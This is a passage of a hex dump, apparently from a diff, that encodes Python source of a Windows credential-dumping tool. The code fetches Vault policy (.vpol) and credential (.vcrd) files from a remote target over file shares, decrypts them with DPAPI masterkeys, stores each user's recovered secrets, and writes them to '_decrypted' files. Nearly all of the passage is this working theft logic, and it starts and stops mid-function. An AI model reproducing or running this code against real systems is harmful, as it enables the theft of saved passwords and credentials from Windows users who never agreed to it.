+0000c920: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
+0000c930: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
+0000c940: 5661 756c 7420 506f 6c69 6379 2066 696c  Vault Policy fil
+0000c950: 6520 4465 6372 7970 7469 6f6e 2073 7563  e Decryption suc
+0000c960: 6365 7373 6675 6c6c 202d 207b 6c6f 6361  cessfull - {loca
+0000c970: 6c5f 7670 6f6c 5f66 696c 657d 7b62 636f  l_vpol_file}{bco
+0000c980: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+0000c990: 0909 0909 0909 0909 0974 6d70 5f76 6175  .........tmp_vau
+0000c9a0: 6c74 6b65 7973 203d 205b 5d0a 0909 0909  ltkeys = [].....
+0000c9b0: 0909 0909 0909 0909 6966 206b 6579 735b  ........if keys[
+0000c9c0: 274b 6579 3127 5d5b 2753 697a 6527 5d20  'Key1']['Size'] 
+0000c9d0: 3e20 3078 3234 3a0a 0909 0909 0909 0909  > 0x24:.........
+0000c9e0: 0909 0909 0974 6d70 5f76 6175 6c74 6b65  .....tmp_vaultke
+0000c9f0: 7973 2e61 7070 656e 6428 0a09 0909 0909  ys.append(......
+0000ca00: 0909 0909 0909 0909 0927 3078 2573 2720  .........'0x%s' 
+0000ca10: 2520 6269 6e61 7363 6969 2e68 6578 6c69  % binascii.hexli
+0000ca20: 6679 286b 6579 735b 274b 6579 3227 5d5b  fy(keys['Key2'][
+0000ca30: 2762 4b65 7942 6c6f 6227 5d29 290a 0909  'bKeyBlob']))...
+0000ca40: 0909 0909 0909 0909 0909 0974 6d70 5f76  ...........tmp_v
+0000ca50: 6175 6c74 6b65 7973 2e61 7070 656e 6428  aultkeys.append(
+0000ca60: 0a09 0909 0909 0909 0909 0909 0909 0927  ...............'
+0000ca70: 3078 2573 2720 2520 6269 6e61 7363 6969  0x%s' % binascii
+0000ca80: 2e68 6578 6c69 6679 286b 6579 735b 274b  .hexlify(keys['K
+0000ca90: 6579 3127 5d5b 2762 4b65 7942 6c6f 6227  ey1']['bKeyBlob'
+0000caa0: 5d29 290a 0909 0909 0909 0909 0909 0909  ])).............
+0000cab0: 656c 7365 3a0a 0909 0909 0909 0909 0909  else:...........
+0000cac0: 0909 0974 6d70 5f76 6175 6c74 6b65 7973  ...tmp_vaultkeys
+0000cad0: 2e61 7070 656e 6428 0a09 0909 0909 0909  .append(........
+0000cae0: 0909 0909 0909 0927 3078 2573 2720 2520  .......'0x%s' % 
+0000caf0: 6269 6e61 7363 6969 2e68 6578 6c69 6679  binascii.hexlify
+0000cb00: 280a 0909 0909 0909 0909 0909 0909 0909  (...............
+0000cb10: 096b 6579 735b 274b 6579 3227 5d5b 2762  .keys['Key2']['b
+0000cb20: 4b65 7942 6c6f 6227 5d5b 2762 4b65 7927  KeyBlob']['bKey'
+0000cb30: 5d29 2e64 6563 6f64 6528 276c 6174 696e  ]).decode('latin
+0000cb40: 2d31 2729 290a 0909 0909 0909 0909 0909  -1'))...........
+0000cb50: 0909 0974 6d70 5f76 6175 6c74 6b65 7973  ...tmp_vaultkeys
+0000cb60: 2e61 7070 656e 6428 0a09 0909 0909 0909  .append(........
+0000cb70: 0909 0909 0909 0927 3078 2573 2720 2520  .......'0x%s' % 
+0000cb80: 6269 6e61 7363 6969 2e68 6578 6c69 6679  binascii.hexlify
+0000cb90: 280a 0909 0909 0909 0909 0909 0909 0909  (...............
+0000cba0: 096b 6579 735b 274b 6579 3127 5d5b 2762  .keys['Key1']['b
+0000cbb0: 4b65 7942 6c6f 6227 5d5b 2762 4b65 7927  KeyBlob']['bKey'
+0000cbc0: 5d29 2e64 6563 6f64 6528 276c 6174 696e  ]).decode('latin
+0000cbd0: 2d31 2729 290a 0909 0909 0909 0909 0909  -1'))...........
+0000cbe0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+0000cbf0: 6562 7567 280a 0909 0909 0909 0909 0909  ebug(...........
+0000cc00: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
+0000cc10: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
+0000cc20: 5361 7669 6e67 207b 6c65 6e28 746d 705f  Saving {len(tmp_
+0000cc30: 7661 756c 746b 6579 7329 7d20 5661 756c  vaultkeys)} Vaul
+0000cc40: 7420 6b65 7973 207b 6263 6f6c 6f72 732e  t keys {bcolors.
+0000cc50: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
+0000cc60: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
+0000cc70: 6f6e 676e 616d 655d 5b27 7670 6f6c 5f73  ongname]['vpol_s
+0000cc80: 7461 7475 7327 5d20 3d20 2764 6563 7279  tatus'] = 'decry
+0000cc90: 7074 6564 270a 0909 0909 0909 0909 0909  pted'...........
+0000cca0: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
+0000ccb0: 676e 616d 655d 5b27 7374 6174 7573 275d  gname]['status']
+0000ccc0: 203d 2027 6465 6372 7970 7465 6427 0a09   = 'decrypted'..
+0000ccd0: 0909 0909 0909 0909 0909 0975 7365 722e  ...........user.
+0000cce0: 6669 6c65 735b 6c6f 6e67 6e61 6d65 5d5b  files[longname][
+0000ccf0: 2764 6174 6127 5d20 3d20 746d 705f 7661  'data'] = tmp_va
+0000cd00: 756c 746b 6579 730a 0909 0909 0909 0909  ultkeys.........
+0000cd10: 0909 0965 6c73 653a 0a09 0909 0909 0909  ...else:........
+0000cd20: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+0000cd30: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
+0000cd40: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
+0000cd50: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+0000cd60: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
+0000cd70: 494e 477d 4572 726f 7220 6465 6372 7970  ING}Error decryp
+0000cd80: 7469 6e67 2050 6f6c 6963 792e 7670 6f6c  ting Policy.vpol
+0000cd90: 207b 6c6f 6361 6c5f 7670 6f6c 5f66 696c   {local_vpol_fil
+0000cda0: 657d 2077 6974 6820 4d61 7374 6572 6b65  e} with Masterke
+0000cdb0: 797b 6263 6f6c 6f72 732e 454e 4443 7d22  y{bcolors.ENDC}"
+0000cdc0: 290a 0909 0909 0909 0909 0909 0909 636f  ).............co
+0000cdd0: 6e74 696e 7565 0a09 0909 0909 0909 0909  ntinue..........
+0000cde0: 0965 6c73 653a 0a09 0909 0909 0909 0909  .else:..........
+0000cdf0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+0000ce00: 6562 7567 280a 0909 0909 0909 0909 0909  ebug(...........
+0000ce10: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
+0000ce20: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
+0000ce30: 6263 6f6c 6f72 732e 5741 524e 494e 477d  bcolors.WARNING}
+0000ce40: 4572 726f 7220 6465 6372 7970 7469 6e67  Error decrypting
+0000ce50: 2050 6f6c 6963 792e 7670 6f6c 207b 6c6f   Policy.vpol {lo
+0000ce60: 6361 6c5f 7670 6f6c 5f66 696c 657d 2077  cal_vpol_file} w
+0000ce70: 6974 6820 4d61 7374 6572 6b65 7920 2d20  ith Masterkey - 
+0000ce80: 4d61 7374 6572 6b65 7920 6e6f 7420 6465  Masterkey not de
+0000ce90: 6372 7970 7465 647b 6263 6f6c 6f72 732e  crypted{bcolors.
+0000cea0: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
+0000ceb0: 0909 0963 6f6e 7469 6e75 650a 0909 0909  ...continue.....
+0000cec0: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
+0000ced0: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+0000cee0: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
+0000cef0: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+0000cf00: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+0000cf10: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
+0000cf20: 477d 4572 726f 7220 6465 6372 7970 7469  G}Error decrypti
+0000cf30: 6e67 2050 6f6c 6963 792e 7670 6f6c 207b  ng Policy.vpol {
+0000cf40: 6c6f 6361 6c5f 7670 6f6c 5f66 696c 657d  local_vpol_file}
+0000cf50: 2077 6974 6820 4d61 7374 6572 6b65 792d   with Masterkey-
+0000cf60: 2063 616e 7420 6765 7420 6d61 7374 6572   cant get master
+0000cf70: 6b65 7920 7b67 7569 647d 7b62 636f 6c6f  key {guid}{bcolo
+0000cf80: 7273 2e45 4e44 437d 2229 0a09 0909 0909  rs.ENDC}")......
+0000cf90: 0909 0909 0963 6f6e 7469 6e75 650a 0909  .....continue...
+0000cfa0: 0909 0909 0909 656c 7365 3a0a 0909 0909  ......else:.....
+0000cfb0: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+0000cfc0: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
+0000cfd0: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
+0000cfe0: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
+0000cff0: 7b62 636f 6c6f 7273 2e57 4152 4e49 4e47  {bcolors.WARNING
+0000d000: 7d45 7272 6f72 2064 6563 7279 7074 696e  }Error decryptin
+0000d010: 6720 506f 6c69 6379 2e76 706f 6c20 7b6c  g Policy.vpol {l
+0000d020: 6f63 616c 5f76 706f 6c5f 6669 6c65 7d20  ocal_vpol_file} 
+0000d030: 7769 7468 204d 6173 7465 726b 6579 202d  with Masterkey -
+0000d040: 2063 616e 2074 2067 6574 2074 6865 2047   can t get the G
+0000d050: 5549 4420 6f66 206d 6173 7465 726b 6579  UID of masterkey
+0000d060: 2066 726f 6d20 626c 6f62 2066 696c 657b   from blob file{
+0000d070: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
+0000d080: 0909 0909 0909 0909 0963 6f6e 7469 6e75  .........continu
+0000d090: 650a 0a09 0909 0909 0909 6578 6365 7074  e.........except
+0000d0a0: 2045 7863 6570 7469 6f6e 2061 7320 6578   Exception as ex
+0000d0b0: 3a0a 0909 0909 0909 0909 7365 6c66 2e6c  :.........self.l
+0000d0c0: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
+0000d0d0: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
+0000d0e0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+0000d0f0: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
+0000d100: 4e49 4e47 7d45 7863 6570 7469 6f6e 2064  NING}Exception d
+0000d110: 6563 7279 7074 696e 6720 506f 6c69 6379  ecrypting Policy
+0000d120: 2e76 706f 6c20 7b6c 6f63 616c 5f76 706f  .vpol {local_vpo
+0000d130: 6c5f 6669 6c65 7d20 7769 7468 204d 6173  l_file} with Mas
+0000d140: 7465 726b 6579 7b62 636f 6c6f 7273 2e45  terkey{bcolors.E
+0000d150: 4e44 437d 2229 0a09 0909 0909 0909 0973  NDC}").........s
+0000d160: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+0000d170: 6728 6578 290a 0909 0909 0909 0909 636f  g(ex).........co
+0000d180: 6e74 696e 7565 0a0a 0909 0909 0909 0923  ntinue.........#
+0000d190: 204c 6f6f 6b20 666f 7220 2e76 7363 6820   Look for .vsch 
+0000d1a0: 3a20 5661 756c 7420 5363 6865 6d61 2066  : Vault Schema f
+0000d1b0: 696c 650a 0a09 0909 0909 0909 2320 5468  ile.........# Th
+0000d1c0: 656e 2067 6574 7320 2a2e 7663 7264 2066  en gets *.vcrd f
+0000d1d0: 696c 6573 0a09 0909 0909 0909 6d79 5f64  iles........my_d
+0000d1e0: 6972 6563 746f 7279 3220 3d20 7365 6c66  irectory2 = self
+0000d1f0: 2e6d 7966 696c 656f 7073 2e64 6f5f 6c73  .myfileops.do_ls
+0000d200: 2874 6d70 5f70 7764 322c 206d 795f 6d61  (tmp_pwd2, my_ma
+0000d210: 736b 2c20 6469 7370 6c61 793d 4661 6c73  sk, display=Fals
+0000d220: 6529 0a09 0909 0909 0909 7365 6c66 2e6c  e)........self.l
+0000d230: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
+0000d240: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
+0000d250: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+0000d260: 7d5d 2046 6f75 6e64 207b 6c65 6e28 6d79  }] Found {len(my
+0000d270: 5f64 6972 6563 746f 7279 3229 7d20 6669  _directory2)} fi
+0000d280: 6c65 7320 696e 207b 746d 705f 7077 6432  les in {tmp_pwd2
+0000d290: 7d22 290a 0909 0909 0909 0966 6f72 2069  }")........for i
+0000d2a0: 6e66 6f73 3220 696e 206d 795f 6469 7265  nfos2 in my_dire
+0000d2b0: 6374 6f72 7932 3a0a 0909 0909 0909 0909  ctory2:.........
+0000d2c0: 6c6f 6e67 6e61 6d65 322c 2069 735f 6469  longname2, is_di
+0000d2d0: 7265 6374 6f72 7932 203d 2069 6e66 6f73  rectory2 = infos
+0000d2e0: 320a 0909 0909 0909 0909 7365 6c66 2e6c  2.........self.l
+0000d2f0: 6f67 6769 6e67 2e64 6562 7567 2822 6c73  ogging.debug("ls
+0000d300: 2072 6574 7572 6e65 6420 6669 6c65 2025   returned file %
+0000d310: 7322 2025 206c 6f6e 676e 616d 6532 290a  s" % longname2).
+0000d320: 0909 0909 0909 0909 6966 206c 6f6e 676e  ........if longn
+0000d330: 616d 6532 206e 6f74 2069 6e20 626c 6163  ame2 not in blac
+0000d340: 6b6c 6973 7420 616e 6420 6e6f 7420 6973  klist and not is
+0000d350: 5f64 6972 6563 746f 7279 3220 616e 6420  _directory2 and 
+0000d360: 6e6f 7420 6c6f 6e67 6e61 6d65 3220 3d3d  not longname2 ==
+0000d370: 2022 506f 6c69 6379 2e76 706f 6c22 3a0a   "Policy.vpol":.
+0000d380: 0909 0909 0909 0909 0974 7279 3a0a 0909  .........try:...
+0000d390: 0909 0909 0909 0909 2320 446f 776e 6c6f  ........# Downlo
+0000d3a0: 6164 696e 6720 426c 6f62 2066 696c 650a  ading Blob file.
+0000d3b0: 0909 0909 0909 0909 0909 6c6f 6361 6c66  ..........localf
+0000d3c0: 696c 6520 3d20 7365 6c66 2e6d 7966 696c  ile = self.myfil
+0000d3d0: 656f 7073 2e67 6574 5f66 696c 6528 6e74  eops.get_file(nt
+0000d3e0: 7061 7468 2e6a 6f69 6e28 746d 705f 7077  path.join(tmp_pw
+0000d3f0: 6432 2c20 6c6f 6e67 6e61 6d65 3229 290a  d2, longname2)).
+0000d400: 0909 0909 0909 0909 0909 6966 206c 6f6e  ..........if lon
+0000d410: 676e 616d 6532 5b2d 343a 5d20 3d3d 2027  gname2[-4:] == '
+0000d420: 7673 6368 273a 2020 2320 5041 5320 4732  vsch':  # PAS G2
+0000d430: 5232 2070 6f75 7220 6c65 206d 6f6d 656e  R2 pour le momen
+0000d440: 740a 0909 0909 0909 0909 0909 0975 7365  t............use
+0000d450: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
+0000d460: 5d5b 2776 7363 6827 5d5b 6c6f 6361 6c66  ]['vsch'][localf
+0000d470: 696c 655d 203d 207b 7d0a 0909 0909 0909  ile] = {}.......
+0000d480: 0909 0909 0975 7365 722e 6669 6c65 735b  .....user.files[
+0000d490: 6c6f 6e67 6e61 6d65 5d5b 2776 7363 6827  longname]['vsch'
+0000d4a0: 5d5b 6c6f 6361 6c66 696c 655d 5b27 7374  ][localfile]['st
+0000d4b0: 6174 7573 275d 203d 2027 656e 6372 7970  atus'] = 'encryp
+0000d4c0: 7465 6427 0a09 0909 0909 0909 0909 0909  ted'............
+0000d4d0: 7573 6572 2e66 696c 6573 5b6c 6f6e 676e  user.files[longn
+0000d4e0: 616d 655d 5b27 7673 6368 275d 5b6c 6f63  ame]['vsch'][loc
+0000d4f0: 616c 6669 6c65 5d5b 2774 7970 6527 5d20  alfile]['type'] 
+0000d500: 3d20 2776 7363 6827 0a09 0909 0909 0909  = 'vsch'........
+0000d510: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
+0000d520: 6f6e 676e 616d 655d 5b27 7673 6368 275d  ongname]['vsch']
+0000d530: 5b6c 6f63 616c 6669 6c65 5d5b 2776 6175  [localfile]['vau
+0000d540: 6c74 5f6e 616d 6527 5d20 3d20 6c6f 6e67  lt_name'] = long
+0000d550: 6e61 6d65 320a 0909 0909 0909 0909 0909  name2...........
+0000d560: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+0000d570: 6e61 6d65 5d5b 2776 7363 6827 5d5b 6c6f  name]['vsch'][lo
+0000d580: 6361 6c66 696c 655d 5b27 7061 7468 275d  calfile]['path']
+0000d590: 203d 206c 6f63 616c 6669 6c65 0a09 0909   = localfile....
+0000d5a0: 0909 0909 0909 0909 636f 6e74 696e 7565  ........continue
+0000d5b0: 0a09 0909 0909 0909 0909 0965 6c69 6620  ...........elif 
+0000d5c0: 6c6f 6e67 6e61 6d65 325b 2d34 3a5d 203d  longname2[-4:] =
+0000d5d0: 3d20 2776 6372 6427 3a0a 0909 0909 0909  = 'vcrd':.......
+0000d5e0: 0909 0909 0975 7365 722e 6669 6c65 735b  .....user.files[
+0000d5f0: 6c6f 6e67 6e61 6d65 5d5b 2776 6372 6427  longname]['vcrd'
+0000d600: 5d5b 6c6f 6361 6c66 696c 655d 203d 207b  ][localfile] = {
+0000d610: 7d0a 0909 0909 0909 0909 0909 0975 7365  }............use
+0000d620: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
+0000d630: 5d5b 2776 6372 6427 5d5b 6c6f 6361 6c66  ]['vcrd'][localf
+0000d640: 696c 655d 5b27 7374 6174 7573 275d 203d  ile]['status'] =
+0000d650: 2027 656e 6372 7970 7465 6427 0a09 0909   'encrypted'....
+0000d660: 0909 0909 0909 0909 7573 6572 2e66 696c  ........user.fil
+0000d670: 6573 5b6c 6f6e 676e 616d 655d 5b27 7663  es[longname]['vc
+0000d680: 7264 275d 5b6c 6f63 616c 6669 6c65 5d5b  rd'][localfile][
+0000d690: 2774 7970 6527 5d20 3d20 2776 6372 6427  'type'] = 'vcrd'
+0000d6a0: 0a09 0909 0909 0909 0909 0909 7573 6572  ............user
+0000d6b0: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
+0000d6c0: 5b27 7663 7264 275d 5b6c 6f63 616c 6669  ['vcrd'][localfi
+0000d6d0: 6c65 5d5b 2776 6175 6c74 5f6e 616d 6527  le]['vault_name'
+0000d6e0: 5d20 3d20 6c6f 6e67 6e61 6d65 320a 0909  ] = longname2...
+0000d6f0: 0909 0909 0909 0909 0975 7365 722e 6669  .........user.fi
+0000d700: 6c65 735b 6c6f 6e67 6e61 6d65 5d5b 2776  les[longname]['v
+0000d710: 6372 6427 5d5b 6c6f 6361 6c66 696c 655d  crd'][localfile]
+0000d720: 5b27 7061 7468 275d 203d 206c 6f63 616c  ['path'] = local
+0000d730: 6669 6c65 0a0a 0909 0909 0909 0909 0909  file............
+0000d740: 6d79 6f70 7469 6f6e 7320 3d20 636f 7079  myoptions = copy
+0000d750: 2e64 6565 7063 6f70 7928 7365 6c66 2e6f  .deepcopy(self.o
+0000d760: 7074 696f 6e73 290a 0909 0909 0909 0909  ptions).........
+0000d770: 0909 6d79 6f70 7469 6f6e 732e 7663 7264  ..myoptions.vcrd
+0000d780: 203d 206c 6f63 616c 6669 6c65 2020 2320   = localfile  # 
+0000d790: 5661 756c 7420 4669 6c65 2074 6f20 7061  Vault File to pa
+0000d7a0: 7273 650a 0909 0909 0909 0909 0909 6d79  rse...........my
+0000d7b0: 6f70 7469 6f6e 732e 7661 756c 746b 6579  options.vaultkey
+0000d7c0: 7320 3d20 746d 705f 7661 756c 746b 6579  s = tmp_vaultkey
+0000d7d0: 730a 0909 0909 0909 0909 0909 6d79 6f70  s...........myop
+0000d7e0: 7469 6f6e 732e 7670 6f6c 203d 204e 6f6e  tions.vpol = Non
+0000d7f0: 650a 0909 0909 0909 0909 0909 6d79 6f70  e...........myop
+0000d800: 7469 6f6e 732e 6b65 7920 3d20 4e6f 6e65  tions.key = None
+0000d810: 0a09 0909 0909 0909 0909 096d 7964 7061  ...........mydpa
+0000d820: 7069 203d 2044 5041 5049 286d 796f 7074  pi = DPAPI(myopt
+0000d830: 696f 6e73 2c20 7365 6c66 2e6c 6f67 6769  ions, self.loggi
+0000d840: 6e67 290a 0909 0909 0909 0909 0909 7661  ng)...........va
+0000d850: 756c 745f 6461 7461 2c20 6461 7461 5f74  ult_data, data_t
+0000d860: 7970 6520 3d20 6d79 6470 6170 692e 6465  ype = mydpapi.de
+0000d870: 6372 7970 745f 7661 756c 7428 290a 0909  crypt_vault()...
+0000d880: 0909 0909 0909 0909 6966 2076 6175 6c74  ........if vault
+0000d890: 5f64 6174 6120 213d 204e 6f6e 653a 0a09  _data != None:..
+0000d8a0: 0909 0909 0909 0909 0909 7573 6572 2e66  ..........user.f
+0000d8b0: 696c 6573 5b6c 6f6e 676e 616d 655d 5b27  iles[longname]['
+0000d8c0: 7663 7264 275d 5b6c 6f63 616c 6669 6c65  vcrd'][localfile
+0000d8d0: 5d5b 2773 7461 7475 7327 5d20 3d20 2764  ]['status'] = 'd
+0000d8e0: 6563 7279 7074 6564 270a 0909 0909 0909  ecrypted'.......
+0000d8f0: 0909 0909 0975 7365 722e 6669 6c65 735b  .....user.files[
+0000d900: 6c6f 6e67 6e61 6d65 5d5b 2776 6372 6427  longname]['vcrd'
+0000d910: 5d5b 6c6f 6361 6c66 696c 655d 5b27 6461  ][localfile]['da
+0000d920: 7461 275d 203d 2076 6175 6c74 5f64 6174  ta'] = vault_dat
+0000d930: 610a 0909 0909 0909 0909 0909 0975 7365  a............use
+0000d940: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
+0000d950: 5d5b 2776 6372 6427 5d5b 6c6f 6361 6c66  ]['vcrd'][localf
+0000d960: 696c 655d 5b27 7661 756c 745f 7479 7065  ile]['vault_type
+0000d970: 275d 203d 2064 6174 615f 7479 7065 0a09  '] = data_type..
+0000d980: 0909 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
+0000d990: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
+0000d9a0: 0909 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
+0000d9b0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+0000d9c0: 6970 7d5d 207b 6263 6f6c 6f72 732e 4f4b  ip}] {bcolors.OK
+0000d9d0: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
+0000d9e0: 616d 657d 207b 6263 6f6c 6f72 732e 4f4b  ame} {bcolors.OK
+0000d9f0: 4752 4545 4e7d 5661 756c 7420 2e76 6372  GREEN}Vault .vcr
+0000da00: 6420 4465 6372 7970 7469 6f6e 2073 7563  d Decryption suc
+0000da10: 6365 7373 6675 6c6c 202d 207b 6c6f 6361  cessfull - {loca
+0000da20: 6c66 696c 657d 7b62 636f 6c6f 7273 2e45  lfile}{bcolors.E
+0000da30: 4e44 437d 2229 0a09 0909 0909 0909 0909  NDC}")..........
+0000da40: 0973 656c 662e 7072 6f63 6573 735f 6465  .self.process_de
+0000da50: 6372 7970 7465 645f 7661 756c 7428 7573  crypted_vault(us
+0000da60: 6572 2c20 7573 6572 2e66 696c 6573 5b6c  er, user.files[l
+0000da70: 6f6e 676e 616d 655d 5b27 7663 7264 275d  ongname]['vcrd']
+0000da80: 5b0a 0909 0909 0909 0909 0909 096c 6f63  [............loc
+0000da90: 616c 6669 6c65 5d29 2020 2320 7661 756c  alfile])  # vaul
+0000daa0: 745f 6461 7461 2c75 7365 722c 6c6f 6361  t_data,user,loca
+0000dab0: 6c66 696c 652c 6d79 5f62 6c6f 625f 7479  lfile,my_blob_ty
+0000dac0: 7065 2c61 7267 733d 5b6c 6f6e 676e 616d  pe,args=[longnam
+0000dad0: 6532 2c64 6174 615f 7479 7065 5d29 0a0a  e2,data_type])..
+0000dae0: 0909 0909 0909 0909 0965 7863 6570 7420  .........except 
+0000daf0: 4578 6365 7074 696f 6e20 6173 2065 783a  Exception as ex:
+0000db00: 0a09 0909 0909 0909 0909 0973 656c 662e  ...........self.
+0000db10: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
+0000db20: 0909 0909 0909 0909 0909 6622 5b7b 7365  ..........f"[{se
+0000db30: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+0000db40: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
+0000db50: 5741 524e 494e 477d 4578 6365 7074 696f  WARNING}Exceptio
+0000db60: 6e20 6465 6372 7970 7469 6e67 2076 6372  n decrypting vcr
+0000db70: 6420 5661 756c 7420 7769 7468 204d 6173  d Vault with Mas
+0000db80: 7465 726b 6579 202d 207b 6c6f 6e67 6e61  terkey - {longna
+0000db90: 6d65 327d 207b 6263 6f6c 6f72 732e 454e  me2} {bcolors.EN
+0000dba0: 4443 7d22 290a 0909 0909 0909 0909 0909  DC}")...........
+0000dbb0: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+0000dbc0: 7567 2865 7829 0a09 0972 6574 7572 6e20  ug(ex)...return 
+0000dbd0: 310a 0a09 6465 6620 6475 6d70 5f74 6f5f  1...def dump_to_
+0000dbe0: 6669 6c65 2873 656c 662c 206c 6f63 616c  file(self, local
+0000dbf0: 6669 6c65 5f65 6e63 7279 7074 6564 2c20  file_encrypted, 
+0000dc00: 6c6f 6361 6c64 6174 615f 6465 6372 7970  localdata_decryp
+0000dc10: 7465 6429 3a0a 0909 7365 6c66 2e6c 6f67  ted):...self.log
+0000dc20: 6769 6e67 2e64 6562 7567 2866 225b 7b73  ging.debug(f"[{s
+0000dc30: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+0000dc40: 6574 5f69 707d 5d20 4475 6d70 696e 6720  et_ip}] Dumping 
+0000dc50: 6465 6372 7970 7465 6420 7b6c 6f63 616c  decrypted {local
+0000dc60: 6669 6c65 5f65 6e63 7279 7074 6564 7d20  file_encrypted} 
+0000dc70: 746f 2066 696c 657b 6263 6f6c 6f72 732e  to file{bcolors.
+0000dc80: 454e 4443 7d22 290a 0909 7472 793a 0a09  ENDC}")...try:..
+0000dc90: 0909 6c6f 6361 6c66 696c 655f 6465 6372  ..localfile_decr
+0000dca0: 7970 7465 6420 3d20 6f73 2e70 6174 682e  ypted = os.path.
+0000dcb0: 6a6f 696e 286f 732e 7061 7468 2e73 706c  join(os.path.spl
+0000dcc0: 6974 286c 6f63 616c 6669 6c65 5f65 6e63  it(localfile_enc
+0000dcd0: 7279 7074 6564 295b 305d 2c0a 0909 0909  rypted)[0],.....
+0000dce0: 0909 0909 0909 0920 2020 6f73 2e70 6174  .......   os.pat
+0000dcf0: 682e 7370 6c69 7428 6c6f 6361 6c66 696c  h.split(localfil
+0000dd00: 655f 656e 6372 7970 7465 6429 5b31 5d20  e_encrypted)[1] 
+0000dd10: 2b20 225f 6465 6372 7970 7465 6422 290a  + "_decrypted").
+0000dd20: 0909 0966 6820 3d20 6f70 656e 286c 6f63  ...fh = open(loc
+0000dd30: 616c 6669 6c65 5f64 6563 7279 7074 6564  alfile_decrypted
+0000dd40: 2c20 2777 6227 290a 0909 0966 682e 7772  , 'wb')....fh.wr
+0000dd50: 6974 6528 6622 7b6c 6f63 616c 6461 7461  ite(f"{localdata
+0000dd60: 5f64 6563 7279 7074 6564 7d22 2e65 6e63  _decrypted}".enc
+0000dd70: 6f64 6528 2775 7466 2d38 2729 290a 0909  ode('utf-8'))...
+0000dd80: 0966 682e 636c 6f73 6528 290a 0909 0972  .fh.close()....r
+0000dd90: 6574 7572 6e20 310a 0909 6578 6365 7074  eturn 1...except
+0000dda0: 2045 7863 6570 7469 6f6e 2061 7320 6578   Exception as ex
+0000ddb0: 3a0a 0909 0973 656c 662e 6c6f 6767 696e  :....self.loggin
+0000ddc0: 672e 6465 6275 6728 6622 5b7b 7365 6c66  g.debug(f"[{self
+0000ddd0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+0000dde0: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
+0000ddf0: 524e 494e 477d 4578 6365 7074 696f 6e20  RNING}Exception 
+0000de00: 6475 6d70 5f74 6f5f 6669 6c65 7b62 636f  dump_to_file{bco
+0000de10: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+0000de20: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+0000de30: 7567 2865 7829 0a0a 0964 6566 2070 726f  ug(ex)...def pro
+0000de40: 6365 7373 5f64 6563 7279 7074 6564 5f64  cess_decrypted_d
+0000de50: 6174 6128 7365 6c66 2c20 7573 6572 2c20  ata(self, user, 
+0000de60: 7365 6372 6574 5f66 696c 6529 3a20 2023  secret_file):  #
+0000de70: 2064 6174 6120 2c75 7365 7220 2c6c 6f63   data ,user ,loc
